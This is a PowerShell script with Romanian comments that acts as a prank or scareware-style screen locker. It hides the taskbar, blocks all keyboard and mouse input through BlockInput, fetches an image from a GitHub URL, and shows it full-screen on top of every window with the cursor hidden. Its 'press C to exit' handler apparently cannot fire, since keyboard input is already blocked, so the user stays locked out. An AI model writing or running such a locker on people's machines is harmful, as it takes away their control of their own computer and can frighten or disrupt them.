Add-Type -AssemblyName System.Windows.Forms

# Cod C# pentru blocarea mouse și tastatură
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

# Ascunde Taskbar-ul
$shell = New-Object -ComObject "Shell.Application"
$shell.MinimizeAll()
Start-Sleep -Milliseconds 500
$taskBar = (Get-Process | Where-Object { $_.MainWindowTitle -eq "" -and $_.ProcessName -eq "explorer" })
if ($taskBar) {
    $taskBar | ForEach-Object { $_.MainWindowHandle | ForEach-Object { [void][System.Runtime.InteropServices.Marshal]::Release($_) } }
}
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TaskbarHider {
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$hWnd = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
[TaskbarHider]::ShowWindow($hWnd, 0)  # 0 = SW_HIDE

# Descarcă poza dacă nu există deja
$tempImage = "$env:TEMP\poza_laptop.jpg"
if (-not (Test-Path $tempImage)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage
}

# Blochează input total
[InputBlocker]::BlockInput($true)

# Creează fereastra
$form = New-Object Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.BackColor = 'Black'
$form.KeyPreview = $true
$form.Cursor = [System.Windows.Forms.Cursors]::None

# Încarcă imaginea
$pictureBox = New-Object Windows.Forms.PictureBox
$pictureBox.ImageLocation = $tempImage
$pictureBox.SizeMode = 'Zoom'
$pictureBox.Dock = 'Fill'
$form.Controls.Add($pictureBox)

# Apăsare tasta C pentru ieșire
$form.Add_KeyDown({
    if ($_.KeyCode -eq 'C') {
        # Afișează taskbar-ul înapoi
        [TaskbarHider]::ShowWindow($hWnd, 1)  # 1 = SW_SHOWNORMAL

        # Deblochează input
        [InputBlocker]::BlockInput($false)

        # Închide fereastra
        $form.Close()
    }
})

# Rulează
$form.ShowDialog()
